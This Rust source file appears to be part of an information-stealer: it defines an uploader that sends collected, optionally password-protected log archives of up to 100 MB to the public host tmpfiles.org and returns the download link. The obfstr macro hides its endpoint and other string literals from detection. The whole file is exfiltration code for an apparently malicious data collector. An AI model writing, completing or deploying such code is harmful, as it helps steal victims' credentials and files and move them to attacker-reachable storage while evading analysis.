use crate::external_upload::{base_upload, Uploader};
use crate::size_limit::SizeLimitWrapper;
use crate::{LogFile, LogSender, SendError};
use alloc::sync::Arc;
use collector::Collector;
use delegate::delegate;
use json::parse;
use obfstr::obfstr as s;

const MAX_FILESIZE: usize = 100 * 1024 * 1024;

/// https://tmpfiles.org uploader wrapper around an inner [`LogSender`].
///
/// # Take into account
///
/// - The maximum supported log file size is **100 MB**.
/// - Uploaded files will be automatically **deleted 60 minutes** after upload.
#[derive(Clone)]
pub struct TmpFilesUploader<T: LogSender> {
    inner: SizeLimitWrapper<Uploader<T>>,
}

impl<T: LogSender> TmpFilesUploader<T> {
    pub fn new(inner: T) -> Self {
        Self {
            inner: SizeLimitWrapper::new(
                Uploader::new(Arc::from(s!("tmpfiles")), inner, upload),
                MAX_FILESIZE,
                false,
            ),
        }
    }
}

fn upload(name: &str, bytes: &[u8]) -> Option<Arc<str>> {
    let response = base_upload(name, s!("https://tmpfiles.org/api/v1/upload"), bytes)?;

    Some(
        parse(response.body())
            .ok()?
            .get(s!("data"))?
            .get(s!("url"))?
            .as_string()?
            .clone()
            .into(),
    )
}

impl<T: LogSender> LogSender for TmpFilesUploader<T> {
    delegate! {
        to self.inner {
            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
            where P: AsRef<str> + Clone, C: Collector;
        }
    }
}
